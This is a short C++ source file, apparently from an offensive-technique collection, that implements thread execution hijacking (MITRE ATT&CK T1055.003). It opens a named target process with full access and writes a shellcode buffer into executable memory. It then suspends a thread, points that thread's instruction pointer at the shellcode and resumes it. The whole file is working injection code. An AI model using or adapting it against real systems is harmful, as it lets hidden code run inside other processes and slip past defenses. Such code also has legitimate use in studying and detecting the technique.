#include "inject.h"

// https://attack.mitre.org/techniques/T1055/003/
auto hijack_thread(std::string const& process_name) -> bool
{
  CONTEXT context;
  context.ContextFlags = CONTEXT_FULL;
  LPVOID shellcode_addr = NULL;
  auto found = ::ul::walk_threads_using_toolhelp(process_name, [&](::ul::Thread const& thread) -> ::ul::walk_t {
    if (!shellcode_addr) {
      ::ul::info("Inject shellcode into target process");
      auto process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, 0, thread.process.pid);
      shellcode_addr = ::VirtualAllocEx(process_handle, NULL, sizeof(g_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(process_handle, shellcode_addr, g_shellcode, sizeof(g_shellcode), NULL);
    }

    ::ul::info(std::format("Try to hijack first thread {}", thread.tid));
    auto hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread.tid);
    ::ul::info("Suspend thread");
    SuspendThread(hThread);
    ::ul::info("Hijack thread PC");
    GetThreadContext(hThread, &context);
#if _WIN64
    context.Rip = (DWORD_PTR)shellcode_addr;
#else
  context.Eip = (DWORD_PTR)shellcode_addr;
#endif
    SetThreadContext(hThread, &context);
    ::ul::info("Resume thread");
    ResumeThread(hThread);

    return ::ul::walk_t::WALK_STOP;
  });

  if (!found) {
    ::ul::error("Process not found");
  }

  return found;
}
